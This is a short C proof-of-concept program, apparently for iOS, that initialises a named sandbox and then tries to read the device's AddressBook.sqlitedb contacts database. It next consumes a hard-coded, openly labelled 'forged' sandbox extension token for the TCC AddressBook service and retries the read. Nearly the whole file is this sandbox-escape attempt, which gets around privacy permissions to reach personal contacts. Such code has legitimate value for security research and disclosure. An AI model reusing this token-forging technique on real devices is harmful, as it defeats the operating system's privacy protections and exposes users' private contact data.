#include <stdio.h>
#include <sandbox.h>
#include <unistd.h>
#include <stdlib.h>


int main(int argc, char *argv[]) {
  int rv;
  char *errbuff;

  //rv = sandbox_init(kSBXProfileNoInternet, SANDBOX_NAMED_BUILTIN, &errbuff);
  rv = sandbox_init(argv[1], SANDBOX_NAMED, &errbuff);

  if (rv != 0) 
  {
    fprintf(stderr, "sandbox_init failed: %s\n", errbuff);
    sandbox_free_error(errbuff);
  } 
  else 
  {
    putenv("PS1=[LUKESANDBOXED] \\h:\\w \\u\\$ ");
    printf("pid: %d\n", getpid());
    //execl(argv[2], argv[3], NULL);

    printf("Currently in the container sandbox\n");
    printf("Now trying to read /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\n");
    int c;
    FILE *file;
    file = fopen("/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "r");
    if (file) 
    {
      while ((c = getc(file)) != EOF)
      {
	      putchar(c);
      }
      fclose(file);
      printf("\n");
    }

    printf("If nothing appeared then the read was blocked by the sandbox\n");

    const char *forgedToken = "eb0f03083d56cf560cfd0d28ef19592775de4fdf;00000000;00000000;00000024;com.apple.tcc.kTCCServiceAddressBook;00000001;01000002;0000000000000002;/";
    printf("Consuming a forged token copied from previous run...\n",forgedToken);
    int result = sandbox_extension_consume(forgedToken);

    printf("%d\n",result);

    printf("Now trying to read /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\n");
    file = fopen("/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "r");
    if (file) 
    {
      while ((c = getc(file)) != EOF)
      {
	      putchar(c);
      }
      fclose(file);
      printf("\n");
    }
  }

    return 0;
}
